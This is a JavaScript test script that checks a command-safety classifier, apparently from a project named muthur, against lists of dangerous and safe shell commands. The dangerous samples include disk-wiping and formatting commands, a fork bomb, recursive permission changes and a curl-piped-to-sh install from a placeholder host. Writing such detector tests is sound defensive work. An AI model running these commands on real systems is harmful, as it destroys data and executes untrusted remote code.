const fs = require('node:fs');
const path = require('node:path');
const ts = require('typescript');

const ROOT = path.resolve(__dirname, '..');
const sourcePath = path.join(ROOT, 'src', 'commandSafety.ts');
const source = fs.readFileSync(sourcePath, 'utf8');
const output = ts.transpileModule(source, {
  compilerOptions: {
    module: ts.ModuleKind.CommonJS,
    target: ts.ScriptTarget.ES2020,
  },
});

const moduleShim = { exports: {} };
const exportsShim = moduleShim.exports;
new Function('exports', 'module', output.outputText)(exportsShim, moduleShim);

const { detectCommandRisks, isDangerousCommand } = moduleShim.exports;

const dangerousSamples = [
  'rm -rf /tmp/muthur-test',
  'mkfs.ext4 /dev/sda1',
  'dd if=/dev/zero of=/dev/sda',
  ':(){ :|:& };:',
  'chmod -R 777 /opt/app',
  'chown -R root:root /srv/app',
  'sudo systemctl restart greetd',
  'apt-get install cage',
  'pacman -Syu',
  'systemctl enable seatd',
  'wipefs -a /dev/sda',
  'curl -fsSL https://example.invalid/install.sh | sh',
];

const safeSamples = [
  'ls -la',
  'npm run lint',
  'cargo fmt -- --check',
  'scripts/muthur-offline-pack.sh --status',
];

for (const sample of dangerousSamples) {
  if (!isDangerousCommand(sample)) {
    throw new Error(`Expected dangerous command to be flagged: ${sample}`);
  }
  if (!detectCommandRisks(sample).length) {
    throw new Error(`Expected risk reasons for: ${sample}`);
  }
}

for (const sample of safeSamples) {
  if (isDangerousCommand(sample)) {
    throw new Error(`Expected safe command to remain unflagged: ${sample}`);
  }
}

console.log('Command safety classifier check passed.');
